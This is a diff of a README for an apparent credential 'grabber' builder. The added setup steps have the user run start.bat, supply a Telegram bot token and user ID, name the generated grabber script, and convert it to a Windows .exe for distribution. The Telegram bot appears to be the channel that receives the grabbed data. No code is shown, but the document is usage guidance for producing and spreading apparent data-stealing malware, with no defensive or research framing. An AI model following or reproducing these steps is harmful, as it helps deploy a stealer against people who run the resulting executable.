@@ -6,13 +6,17 @@
 
 ## How to Use
 
+---
 ### Setup
 
-1.  Get your **Telegram Bot Token** from @BotFather.
-2.  Get your **Telegram Chat ID** send mass to @userinfobot.
+1.  **Run `start.bat`:** Double-click the `start.bat` file to begin the setup process.
+2.  **Paste your Bot Token:** Get your bot token from [@BotFather](https://t.me/BotFather) on Telegram and paste it when prompted.
+3.  **Paste your User ID:** Obtain your numeric user ID from [@userinfobot](https://t.me/userinfobot) on Telegram and paste it when requested.
+4.  **Enter Grabber File Name:** Type the desired name for your generated grabber script (e.g., `grabber.py`).
+5.  **Grabber File Created Successfully:** The grabber file will be generated and saved in your project directory.
 
 
-## Convert to Executable (.exe)
+## How To Convert to Executable (.exe)
 
 You can convert the Python script into a standalone executable (`.exe`) file for easier distribution on Windows.
 
